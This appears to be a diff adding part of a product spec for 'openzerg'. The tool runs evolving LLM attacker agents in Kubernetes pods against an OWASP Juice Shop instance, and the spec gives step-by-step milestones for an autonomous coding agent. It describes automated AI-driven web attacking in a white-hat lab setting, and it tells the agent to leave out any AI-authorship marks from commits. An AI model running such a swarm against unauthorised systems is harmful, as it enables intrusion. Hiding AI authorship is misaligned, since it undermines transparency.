+        "go test ./internal/evolve/...",
+        "kubectl -n openzerg get pods (should show pods being created and deleted during a real run)",
+        "./bin/openzerg run --target https://juice-shop-production-d0c5.up.railway.app --population 3 --generations 1"
+      ],
+      "acceptance": [
+        "3 pods are visible in kubectl during the run.",
+        "All 3 results are parsed and printed to stdout.",
+        "All 3 pods are deleted after the run (no leftovers in kubectl get pods).",
+        "Tests for the parser pass."
+      ]
+    },
+    {
+      "id": "M3",
+      "name": "Attacker pod image with PI + Gemma 4 (no Nimble yet)",
+      "goal": "A real registry.digitalocean.com/openzerg/pi-attacker:latest image that, given TARGET_URL and a GENOME, runs a single PI session against the target using Gemma 4 via OpenRouter, and prints exactly one final result JSON line.",
+      "tasks": [
+        "FIRST: WebFetch https://pi.dev/docs (and any sub-pages discovered) to learn exact CLI invocation, image name, and skill format. Record findings in docs/ARCHITECTURE.md.",
+        "Write backend/docker/pi-attacker/Dockerfile: base on PI's official image if it exists, else ubuntu:24.04 + PI install per docs.",
+        "Write backend/docker/pi-attacker/entrypoint.sh: read env, write PI config, invoke PI non-interactively, capture output, append result JSON line.",
+        "Author backend/docker/pi-attacker/skills/attacker/skill.yaml + instructions.md per PI's actual skill spec (NOT a guess).",
+        "Author backend/docker/pi-attacker/prompts/system.tmpl with white-hat scope, target URL placeholder, genome placeholder, output schema instructions.",
+        "Build and push: scripts/build-and-push-attacker.sh, runs `doctl registry login` then `docker buildx build --platform=linux/amd64 -t registry.digitalocean.com/openzerg/pi-attacker:latest --push .`.",
+        "Create k8s Secret openzerg-keys via `kubectl create secret generic openzerg-keys --from-env-file=.env -n openzerg`.",
+        "Update internal/spawn to render the real pod spec referencing the new image and the Secret.",
+        "Run: openzerg run --population 3 --generations 1 against juice-shop URL. Pods should attack but no fitness scoring yet — just verify the result line shape."
+      ],
+      "verify": [
+        "docker run --rm -e TARGET_URL=https://juice-shop-production-d0c5.up.railway.app -e GENOME='{...}' -e OPENROUTER_API_KEY=$KEY registry.digitalocean.com/openzerg/pi-attacker:latest # prints valid JSON last line",
+        "kubectl -n openzerg logs <pod> | tail -1 # parses as JSON matching attacker_result_jsonl"
+      ],
+      "acceptance": [
+        "Image builds and pushes.",
+        "Pod runs to completion within activeDeadlineSeconds.",
+        "Final stdout line parses as the result schema.",
+        "No literal API key appears in image layers or pod env (verify with kubectl describe pod)."
+      ]
+    },
+    {
+      "id": "M4",
+      "name": "Nimble integration inside the attacker pod",
+      "goal": "The PI agent inside each pod can call Nimble to fetch a JS-rendered page from the target. At least one seed genome relies on Nimble (e.g., score_board route discovery via rendered DOM scrape).",
+      "tasks": [
+        "FIRST: WebFetch https://docs.nimbleway.com/llms.txt and follow links to identify the correct page-fetch endpoint, auth header, and response shape.",
+        "Implement backend/internal/nimble in Go (for control-plane CVE seeding) AND a parallel TS/Python tool wrapper inside the attacker image so PI can call it as a skill tool.",
+        "Update skills/attacker to expose a 'nimble_fetch' tool to PI, with a clear description telling the model when to use Nimble vs raw HTTP.",
+        "Update at least 2 seed genomes to require Nimble (e.g., score_board, admin_section).",
+        "Add control-plane startup hook: optional Nimble call for 'OWASP Juice Shop CVE 2025' which appends a 'hint' to one Gen-1 genome. Guarded by --enable-cve-seed flag (default off for demo determinism)."
+      ],
+      "verify": [
+        "Inspect a pod's logs: should show one or more 'nimble_fetch' tool calls with non-empty responses.",
+        "openzerg run --population 5 --generations 1 still completes and prints results."
+      ],
+      "acceptance": [
+        "Nimble is observably called in at least one pod per generation.",
+        "Nimble failures are non-fatal (pod still emits a result with fitness>=0).",
+        "Nimble client never leaks the API key into pod logs."
+      ]
+    },
+    {
+      "id": "M5",
+      "name": "Evolution loop, fitness scoring, mutation, summary",
+      "goal": "Full N-generation run with survivors, mutation, stop conditions, and the final summary.{json,md} artifacts.",
+      "tasks": [
+        "Implement internal/evolve/fitness.go per data_contracts.fitness_scoring.",
+        "Implement internal/evolve/mutate.go: pure-Go mutation (primary).",
+        "Implement internal/openrouter client: minimal /chat/completions POST.",
+        "Implement internal/evolve/mutate_llm.go: optional LLM mutation via OpenRouter, guarded by feature flag + budget counter.",
+        "Implement internal/store: in-memory RunStore tracking per-pod results and per-generation aggregates.",
+        "Implement summary writer: ./out/summary-<run_id>.json AND .md. Markdown is a Go text/template.",
+        "Wire run loop: Gen1=seeds; for each gen: spawn POPULATION_SIZE pods, await all, score, pick survivors (cap at SURVIVOR_CAP), mutate to fill next pop, repeat. Stop on fitness=1.0 or gen==MAX_GENERATIONS.",
+        "Add cancellation: SIGINT writes a partial summary and exits 0.",
+        "Add tests for fitness.Score, mutate.Mutate, and ParseLastJSONLine."
+      ],
+      "verify": [
+        "go test ./...",
+        "./bin/openzerg run --target https://juice-shop-production-d0c5.up.railway.app --population 15 --generations 4",
+        "ls ./out/  # summary-*.json and summary-*.md exist",
+        "jq . ./out/summary-*.json # valid"
+      ],
+      "acceptance": [
+        "A full 4-generation run completes in under 12 minutes wall clock.",
+        "summary.json validates against final_summary_json schema.",
+        "summary.md is human-readable and explicitly names the Outcome (BREACH or EXHAUSTED) in the first 3 lines.",
+        "On BREACH, summary.md prints the exact request that worked (path, method, payload, response snippet).",
+        "Ctrl-C mid-run still produces a partial summary."
+      ]
+    },
+    {
+      "id": "M6",
+      "name": "Cleanup, docs, demo script",
+      "goal": "Repository is clean (no Python, no abandoned HTML), has a usable README + DEMO.md, and a recorded successful run artifact lives in ./out/.",
+      "tasks": [
+        "Delete files listed in repo_layout.to_delete_in_M6.",
+        "Write README.md: tagline, one-paragraph what-it-does, run command, sample output snippet.",
+        "Write docs/DEMO.md: 3-minute script aligned with judging criteria.",
+        "Write docs/ARCHITECTURE.md: 1-page diagram (from architecture.diagram_ascii) + the M3/M4 research notes from PI and Nimble docs.",
+        "Commit a sample ./out/summary-demo.json + .md from a successful run (sanitized of any real tokens)."
+      ],
+      "verify": [
+        "git status # only intentional files staged",
+        "go build ./... # still green",
+        "cat README.md # makes sense top-to-bottom"
+      ],
+      "acceptance": [
+        "No .py files remain in repo.",
+        "No HTML/Phaser/Replay artifacts remain in repo.",
+        "README + DEMO + ARCHITECTURE all exist and are non-empty.",
+        "A sample summary artifact is committed."
+      ]
+    }
+  ],
+
+  "acceptance_criteria": {
+    "demo_must_show": [
+      "Terminal: TARGET_URL=https://juice-shop-production-d0c5.up.railway.app ./bin/openzerg run",
+      "kubectl -n openzerg get pods --watch in a second pane showing pods spawning per generation",
+      "Live stdout narrative: Gen 1 results, survivors named, Gen 2 spawns, eventually a BREACH or a 'best_fitness=X.X EXHAUSTED' message",
+      "Final summary.md opened in editor, showing the path the swarm took to its Outcome"
+    ],
+    "code_must_satisfy": [
+      "go build ./... is green at every commit on main.",
+      "go vet ./... is green.",
+      "No real API keys in git history.",
+      "No goroutine leaks: every spawned pod has a matching delete in a defer.",
+      "Every external call (OpenRouter, Nimble, k8s) is wrapped with a context.Context and a timeout."
+    ]
+  },
+
+  "ralph_loop": {
+    "model": "opencode/claude-opus-4-7",
+    "loop_kind": "single-agent self-iterating coding loop",
+    "iteration_protocol": [
+      "1. Read PRD.json and ./ralph-logs/STATE.md (create if missing).",
+      "2. Identify the lowest-numbered milestone that is not yet ACCEPTED in STATE.md.",
+      "3. Identify the smallest next task within that milestone.",
+      "4. Make the smallest possible code change that advances that task.",
+      "5. Run the milestone's verify commands. If anything is red, fix forward; do not move on.",
+      "6. When all of a milestone's acceptance items pass, update STATE.md to mark it ACCEPTED and write a one-line summary.",
+      "7. git add -A && git commit -m '<conventional-commit-msg>' (no co-author trailer).",
+      "8. Loop."
+    ],
+    "start_command": "cd /home/carson/openzerg && (test -f backend/go.mod && cd backend && go build ./... || echo 'M0 not done')",
+    "state_file": "/home/carson/openzerg/ralph-logs/STATE.md",
+    "log_dir": "/home/carson/openzerg/ralph-logs/",
+    "stop_condition": "All milestones M0-M6 marked ACCEPTED in STATE.md AND `go build ./...` is green AND a sample ./out/summary-*.json exists with outcome in {BREACH, EXHAUSTED}.",
+    "commit_style": {
+      "format": "<type>(<scope>): <subject>",
+      "allowed_types": ["feat", "fix", "chore", "docs", "refactor", "test", "build"],
+      "example_subjects": ["feat(spawn): create and delete pods via client-go", "fix(evolve): handle missing trailing newline in pod logs"],
+      "no_co_author_trailers": true,
+      "no_generated_with_text": true
+    },
+    "never_do": [
+      "Never commit any value of OPENROUTER_API_KEY or NIMBLE_API_KEY.",
+      "Never delete this PRD.json.",
+      "Never attack anything other than TARGET_URL.",
+      "Never skip a milestone's verify step.",
+      "Never write Python.",
+      "Never add Datadog code in v1 (it's a deferred stretch goal).",
+      "Never push the control-plane image to the registry (it runs locally).",
+      "Never modify the user's kubeconfig.",
+      "Never delete the kube-system namespace or DigitalOcean-managed system workloads (do-*, csi-*, cilium*, konnectivity-*).",
+      "Never run `kubectl delete ns openzerg` mid-run; only create. (Cleanup of the openzerg namespace at the start of a clean rebuild is fine.)"
+    ],
+    "must_research_before_writing_code": [
+      "Before M3: WebFetch https://pi.dev/docs and resolve all 'research_questions_for_ralph' under integrations.pi.",
+      "Before M4: WebFetch https://docs.nimbleway.com/llms.txt and resolve all 'research_questions_for_ralph' under integrations.nimble."
+    ],
+    "escape_hatches": [
+      "If PI has no usable Docker image, build from base ubuntu:24.04 and install PI CLI via its documented installer.",
+      "If Nimble's API shape doesn't match assumptions, encode whatever IS in their docs and update the PRD via STATE.md (do NOT edit PRD.json silently; record deviations).",
+      "If Gemma 4 is too slow or rate-limited via OpenRouter, fall back to google/gemma-4-26b-a4b-it; if still bad, document and proceed with whatever works.",
+      "If the DO image registry can't be pulled from the cluster, create an imagePullSecret via `doctl registry kubernetes-manifest` and add it to the pod spec."
+    ]
+  }
+}
